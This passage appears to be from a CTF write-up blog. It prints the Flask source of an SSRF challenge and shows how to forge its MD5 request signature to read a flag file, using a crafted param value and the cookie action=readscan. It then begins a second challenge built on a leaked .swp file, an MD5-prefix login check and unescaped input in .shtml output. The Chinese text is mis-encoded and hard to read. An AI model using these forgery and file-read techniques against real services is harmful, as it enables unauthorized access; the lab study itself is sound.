class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># Set default encoding to latin1</span><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>) <span class="hljs-comment">#ç”Ÿæˆä¸€ä¸ª16å­—èŠ‚çš„éšæœºå¯†é’¥</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<span class="hljs-comment">#æ¥å—å››ä¸ªå‚æ•°</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip) <span class="hljs-comment">#åˆ©ç”¨md5ä¸ºipåŠ å¯†ç„¶åèµ‹å€¼ç»™sandboxå±æ€§</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(self.sandbox):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<span class="hljs-comment"># åˆ›å»ºç©ºå­—å…¸</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>        <span class="hljs-keyword">if</span> self.checkSign(): <span class="hljs-comment">#scan å’Œ read</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%sæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå°†è¢«self.sandboxçš„å€¼æ›¿æ¢</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#è·å–HTTPè¯·æ±‚ä¸­åä¸º&quot;param&quot;çš„å‚æ•°çš„å€¼,å¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›ç©ºå­—ç¬¦ä¸²</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#åé¢é‚£ä¸ª&quot;&quot;æ„æ€æ˜¯è¦æ˜¯æ²¡å€¼å°±èµ‹ç©º</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> waf(param):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>] <span class="hljs-comment">## æ‰“å¼€æŒ‡å®šURLå¹¶è¯»å–å‰50ä¸ªå­—ç¬¦çš„å†…å®¹ã€‚ä¸è¿‡æ³¨æ„è¿™ä¸œè¥¿å¹¶æ²¡æœ‰è¾“å‡ºã€‚</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest() <span class="hljs-comment">#è®¡ç®—å“ˆå¸Œå¹¶è½¬æ¢æˆ16è¿›åˆ¶</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#å…ˆå»é¦–ä½ç©ºæ ¼å†è½¬æ¢æˆå°å†™</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#å¦‚æœå˜é‡checkä»¥è¿™ä¸¤ä¸ªå¼€å¤´</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br><br><br><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜åˆšæ‹¿åˆ°çš„æ—¶å€™äººæ™•äº†ã€‚ã€‚ä¸çŸ¥æ€ä¹ˆä¸‹æ‰‹ï¼Œè·Ÿç€è¿™ä½å¸ˆå‚…çš„æ€è·¯åšäº†ä¸€ä¸‹ï¼š<code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><p>ä¸€å…±ä¸‰ä¸ªè·¯ç”±ï¼š<code>/</code>,<code>/De1ta</code>,<code>/geneSign</code>ï¼Œå…ˆçœ‹æ¥å—ä¸€å †å‚æ•°çš„<code>/De1ta</code>è·¯ç”±éƒ½æ‹¿å‚æ•°å¹²äº†å•¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>)) <span class="hljs-comment">#åˆ©ç”¨cookieä¼ actionçš„å€¼</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#getä¼ paramï¼Œè¦æ˜¯æ²¡æœ‰ç›´æ¥èµ‹å€¼ä¸ºç©º</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>)) <span class="hljs-comment">#åˆ©ç”¨cookieä¼ signçš„å€¼</span><br></code></pre></td></tr></table></figure><p>æ¥å—åˆ°çš„<code>param</code>å¸¦å…¥åˆ°<code>waf</code>å‡½æ•°é‡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> waf(param):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br></code></pre></td></tr></table></figure><p>çœ‹çœ‹<code>waf</code>å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#å…ˆå»é¦–ä½ç©ºæ ¼å†è½¬æ¢æˆå°å†™</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#å¦‚æœå˜é‡checkä»¥è¿™ä¸¤ä¸ªå¼€å¤´</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ„é€ ä¸€ä¸ª<code>Task</code>ç±»å¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">task = Task(action, param, sign, ip) <span class="hljs-comment">#æ³¨æ„åœ¨pythonä¸­å®ä¾‹åŒ–ä¸€ä¸ªç±»ä¸éœ€è¦ new,ä½†javaå’Œphpéœ€è¦</span><br><span class="hljs-keyword">return</span> json.dumps(task.Exec()) <span class="hljs-comment">#å°†task.Exec()çš„è¿”å›å€¼è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p>çœ‹ä¸‹<code>Exec</code>è¿™ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>      result = &#123;&#125;<span class="hljs-comment"># åˆ›å»ºç©ºå­—å…¸</span><br>      result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>      <span class="hljs-keyword">if</span> self.checkSign(): <br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%sæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå°†è¢«self.sandboxçš„å€¼æ›¿æ¢</span><br>              resp = scan(self.param) <span class="hljs-comment">#æ³¨æ„è¿™ä¸ªå‡½æ•°ï¼Œæç¤ºflag in ./flag.txtï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡scanå»è¯»è¯¥æ–‡ä»¶å‰50ä¸ªå­—ç¬¦ï¼Œå¯¹äºflagæ¥è¯´è‚¯å®šå¤Ÿç”¨äº†ï¼Œä½†ä»…æœ‰scanå¹¶ä¸èƒ½æŠŠç»“æœè¾“å‡º)</span><br>              <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                  result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>              <span class="hljs-keyword">else</span>:<br>                  <span class="hljs-built_in">print</span> resp<br>                  tmpfile.write(resp)<br>                  tmpfile.close()<br>                  result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action: <span class="hljs-comment">#scanå’Œreadç»„åˆä½¿ç”¨ï¼Œä¸€å†™ä¸€è¯»</span><br>              f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>          <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>      <span class="hljs-keyword">else</span>:<br>          result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>          result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>      <span class="hljs-keyword">return</span> result <br></code></pre></td></tr></table></figure><p>ä»–å…ˆæ£€æŸ¥äº†<code>checkSign</code>æ˜¯å¦ä¸ºçœŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-comment">#checkSign</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°actionå’Œparamç»è¿‡getSignè¿™ä¸ªå‡½æ•°ä¹‹åä¸signç›¸ç­‰ï¼Œå°±è¿”å›true</span><br>       <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>  <span class="hljs-comment"># getSign</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>): <span class="hljs-comment"># ä¸‰ä¸ªå‚æ•°æ‹¼æ¥ç„¶åmd5</span><br>   <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯<code>/geneSign</code>è·¯ç”±ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#è·¯ç”±</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#è·å–HTTPè¯·æ±‚ä¸­åä¸º&quot;param&quot;çš„å‚æ•°çš„å€¼,å¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›ç©ºå­—ç¬¦ä¸²</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br></code></pre></td></tr></table></figure><p>å…¶å®æ¢³ç†å®Œä»£ç æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯æŠŠ<code>./flag.txt</code>çš„å†…å®¹è¯»å‡ºæ¥ -&gt;å¯ä»¥é€šè¿‡<code>Exec()</code>å®ç° - &gt;å®ç°<code>Exec()</code>éœ€è¦æ»¡è¶³<code>self.checkSign()</code>å’Œ<code>&quot;scan&quot; in self.action &amp;&quot;read&quot; in self.action</code>åŒæ—¶ä¸ºçœŸã€‚</p><p>é¦–å…ˆæ˜¯<code>checkSign</code>ï¼Œå¦‚æœæ»¡è¶³<code>hashlib.md5(secert_key + param + action).hexdigest()</code> &#x3D;&#x3D;<code>self.sign</code> æ‰ä¼š<code>return ture</code>ã€‚æˆ‘ä»¬çŸ¥é“<code>signã€action</code>æ˜¯é€šè¿‡<code>cookie</code>ä¼ è¿‡æ¥çš„,<code>param</code>æ˜¯åˆ©ç”¨<code>GET</code>æ–¹æ³•ä¼ è¿‡æ¥çš„ã€‚ä½†ä»…å‰©çš„è¿™ä¸ª<code>secret_key</code>æˆ‘ä»¬å¹¶ä¸çŸ¥é“ã€‚</p><p>è¿™æ—¶å¯ä»¥åˆ©ç”¨<code>/geneSign</code>è¿™ä¸ªè·¯ç”±ï¼Œä»–å¯ä»¥è¿”å›<code>hashlib.md5(secert_key + param + scan).hexdigest()</code>(æ³¨æ„ä»–çš„<code>action</code>äº‹å…ˆå®šä¹‰å¥½äº†ï¼Œæ²¡æ³•ä¿®æ”¹)ã€‚</p><p>å¦‚æœæˆ‘ä»¬è®¿é—®<code>/geneSign?param=flag.txt</code>ï¼Œé‚£ä¹ˆè¿”å›çš„å­—ç¬¦ä¸²ä¼šæ˜¯ï¼š<code>md5(secret_key+flag.txt+scan)</code>ï¼š<code>d7d0f6d0bb268048ca879fc3f180c36d</code></p><p>å¦‚æœæˆ‘ä»¬è®¿é—®<code>/geneSign?param=flag.txtread</code>ï¼Œé‚£ä¹ˆè¿”å›çš„å­—ç¬¦ä¸²ä¼šæ˜¯ï¼š</p><p><code>md5(secret_key+flag.txtread+scan)</code>: <code>50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p>é‚£è¿™ä¸œè¥¿ä¸å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„<code>sign</code>å€¼å—ï¼Ÿ</p><p>æŠ“ä¸ªåŒ…ä¿®æ”¹<code>Cookie:action=readscan;sign=50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p><img src="/img/SSRFME2.png" alt="SSRFME2"></p><p>å‚è€ƒæ–‡ç« <code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ²¡å‘ç°ä»€ä¹ˆæç¤º</p><p><img src="/img/easysearch1.png" alt="easysearch1"></p><p><code>username</code>å’Œ<code>password</code>æ˜¯ä»¥<code>POST</code>å½¢å¼æäº¤çš„ï¼Œæœªç»è¿‡ä»»ä½•åŠ å¯†ï¼š</p><p><img src="/img/easysearch2.png" alt="easysearch2"></p><p>è¯•äº†è¯•æ„Ÿè§‰ä¸æ˜¯SQLæ³¨å…¥ï¼Œé¢˜ç›®<code>EasySearch</code>,ç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹ï¼Ÿ</p><p>æ²¡æ‰«å‡ºæ¥ï¼Œç”¨å¾¡å‰‘æ‰«è¿˜æ˜¯æ²¡æ‰«å‡ºæ¥ã€‚ã€‚åæ¥ç›´æ¥å»çœ‹äº†<code>wp</code>ã€‚ã€‚ã€‚</p><p><code>/index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123; <span class="hljs-comment">//å–å¯†ç åŠ å¯†åçš„å‰å…­ä½ä¸$adminæ¯”è¾ƒï¼Œå‡å¦‚ç›¸ç­‰åˆ™</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆæ‰¾<code>md5</code>åŠ å¯†åå‰å…­ä½æ˜¯<code>6d0bc1</code>çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span 